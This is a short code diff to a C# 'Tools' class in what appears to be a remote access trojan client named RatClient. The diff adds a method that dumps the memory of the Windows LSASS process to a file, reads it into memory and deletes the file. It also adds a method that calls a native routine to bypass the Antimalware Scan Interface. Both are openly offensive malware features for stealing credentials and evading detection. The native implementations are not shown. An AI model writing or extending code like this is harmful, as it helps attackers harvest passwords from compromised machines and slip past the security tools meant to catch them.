@@ -10,9 +10,7 @@ using RatClient.Mtool;
 using System.Management;
 using System.Security.Principal;
 using System.Runtime.Serialization.Json;
-
-
-
+using System.Net.Configuration;
 
 public class Tools
 {
@@ -261,4 +259,17 @@ public class Tools
         return null;
     }
 
+    public static byte[] GetLsassdmp()
+    {
+        int res = NativeMethods.LSASSDump();
+        Console.WriteLine(res);
+        byte[]  buffer = File.ReadAllBytes("dumpfile.dmp");
+        File.Delete("dumpfile.dmp");
+        return buffer;
+    }
+
+    public static bool BypassAmsi()
+    {
+        return NativeMethods.AmsiBypass() == 0;
+    }
 }
